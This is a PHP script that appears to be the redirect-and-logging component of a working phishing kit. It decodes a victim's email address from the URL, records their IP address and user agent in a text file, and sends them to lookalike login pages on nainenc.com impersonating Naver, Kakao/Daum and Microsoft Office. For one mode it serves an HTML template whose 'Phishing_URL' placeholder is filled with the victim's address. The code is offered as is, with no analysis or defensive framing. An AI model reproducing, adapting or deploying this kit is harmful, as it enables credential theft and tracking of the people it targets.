<?php 
$_mode = '';
$ecoded_id ='';
$rtn_url = 'https://mail.naver.com';
     if (isset($_SERVER['REQUEST_URI']))
     {
	   $_url = $_SERVER['REQUEST_URI'];
	   $pos10 = strpos($_url, "&rtnurl=");
	   if ($pos10 == 0) 
	   {
	   	$rtn_url = '';
	   	$pos10 = strlen($_url);
	   }
	   else 
	   {
	   	$rtn_url = substr($_url,$pos10+8,strlen($_url)-$pos10-8);
	   }
	   $pos = strpos($_url, "&recid=");
	   if ($pos == 0) 
	   {
	   	$_mode = '';
	   	$pos = strlen($_url);
	   }
	   else 
	   {
	   	$_mode = substr($_url,$pos+7,$pos10 - $pos-7);
	   }
	   
	$pos1 = strpos($_url, "useeid=");
	if ($pos1 == 0) $ecoded_id = '';
	else 
	{
		
		$ecoded_id = substr($_url,$pos1+7,$pos-$pos1-7);
	}

   }
	//if($_GET['email'] == ''){ header('Location: https://mail.naver.com');exit;}
	$ip = getenv ("REMOTE_ADDR");
	$date=date("F j, Y, g:i a");
		//$ecoded_id=$_GET['email'];
		$fname = sprintf("%s.txt",$_mode.'_'.base64_decode($ecoded_id));
		if(file_exists($fname)){
		  header('Location: '.base64_decode($rtn_url));
		  exit;
	    }
		$handle = fopen($fname, "a+");
		fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
		fwrite($handle, "\r\n");
		fwrite($handle, $ip);
		fwrite($handle, "\r\n");
		fwrite($handle, "-----------------------");
		fclose($handle);
		if($_mode=='nc'){
			$_go_url = "http://nid.nainenc.com/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com&locale=ko_KR&svctype=1&otp=".$ecoded_id."&rtnurl=aHR0cHM6Ly9tYWlsLm5hdmVyLmNvbQ==";
		}
		if($_mode=='kl'){
			$_go_url = "http://accountskakao.nainenc.com/login?continue=https%3A%2F%2Flogins.daum.net%2Faccounts%2Fksso.do%3Frescue%3Dtrue%26url%3Dhttps%253A%252F%252Fwww.daum.net&rtnurl=".$rtn_url."&tlp=".$ecoded_id;
		}
		if($_mode=='nl'){
			$_go_url = "http://nidpon.nainenc.com/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com&otp=".$ecoded_id."&rtnurl=".$rtn_url;
	        $fp = fopen("nattach.html", "r");
	        $_attachhtml = fread($fp,filesize("nattach.html"));
			$_attachhtml = str_replace("ToMail",base64_decode($ecoded_id),$_attachhtml);
			$_attachhtml = str_replace("Phishing_URL",$_go_url,$_attachhtml);
	        fclose($fp);
			echo $_attachhtml;
			exit;
		}
		if($_mode=='gl'){
			//$_go_url = "https://binace.homes/v3/signin/identifier?dsh=S1175292950%3A1662186935234853&continue=https%3A%2F%2Fmyaccount.google.com%2Ftwo-step-verification%2Fbackup-codes%3Futm_source%3Dgoogle-account%26utm_medium%3Dweb%26utm_campaign%3Dbackupcodes-screen%26continue%3Dhttps%3A%2F%2Fmyaccount.google.com%2Fsecurity%3Fhl%253Dko%26pli%3D1%26rapt%3DAEjHL4Pt4cGxSlBBW1YpXkNM_4aHylGdsDT05i3xCelMKw_pyl-0yo-7rgr8eVLDnSTymt59W4IfysXQt-Ab9AVUjbvLcEJH7grqzxZMlqCSsfqMaxF3RyM%26ifkv%3DASKXGp2UDcGM1fzf6nhc0bHjMIaUAOz6WBwPXj2p5H_GDVL36-JtTmHljOhB4Cm0Hhd_lsXVK_Hx8g%26osid%3D1%26passive%3D1209600%26rart%3DANgoxcfhK9gEJtgxolHE8zcCr6vwYS9PCwqdoa-97bANHR-CzlDUG99H6mmc5f9AyvvxkAJdea0uJ9UmSSmWbcs_frcdZwpC0zvhpcaIvyRihZB2pKGzfBY%26flowName%3DGlifWebSignIn%26flowEntry%3DServiceLogin%26dsh%3DS-1258056564%3A1703814475957447%26theme%3Dglif&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQN2RmWKknT1Mu3SLP5hKXHG61kKN7aAkFgGQzh2yEAQnpzDgSaeQfpADAKJ-u1FVXZ31L-3hqzg&otp=&rtnurl=".$rtn_url;
			$_go_url = base64_decode($rtn_url);
			//$fp = fopen("gattach.html", "r");
	        //$_attachhtml = fread($fp,filesize("gattach.html"));
			//$_attachhtml = str_replace("ToMail","",$_attachhtml);
			//$_attachhtml = str_replace("Phishing_URL",$_go_url,$_attachhtml);
	        //fclose($fp);
			//echo $_attachhtml;
			//exit;
		}
		if($_mode=='al'){
			if(stristr($_SERVER['HTTP_USER_AGENT'],"Android")){
				$_go_url = base64_decode($rtn_url);
			}
			else {
				echo "휴대폰에서 접속해주세요.";
				exit;
			}
			
		}
		if($_mode=='hl'){
			$_go_url = "https://loginshmil.nainenc.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638052334139061911.NmQ0NGJhZTctYTdlZS00MTc1LWI3NDUtODgzNmM2NGQzN2U3MGYxMTQ4OTctYzkzZS00ZGQ4LTlhZGEtODQzYzExZDg1NmFm&ui_locales=ko-KR&mkt=ko-KR&state=_hCyYbcaoVwNsfJxbctPjqf7qq5a-C4ULd2qqdXhYeWilY_LODP3-r5CxuGGTtRvvXiIJzfc6jzviRw0v8ILxBVHiJ_DCpPOMZQ-odlYor1GkigvFjozBseSbYtvscnMZnSNaMntxOLTCI5tguIFW0aB3m66QPukyxkB1UqsDK_FkMi2OaTjTtHSVe7AYIA5IVLoIq5hkuh8_w73fMupt0fsXdPbhbnxmOhQUubvAJ6e7oc81mfGIGupzUKFW7SQFIUqFSWkcgRSVFvZT3rJ0g&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0&otp=".$ecoded_id."&rtnurl=aHR0cDovL3BuYmJpby5jb20vZ251Ym9hcmQ0L2FkbS9pbWcvZGF0YS9EZXRhaWwuZG9j
";
		}
		
		
		header('Location: '.$_go_url);
		exit;
?>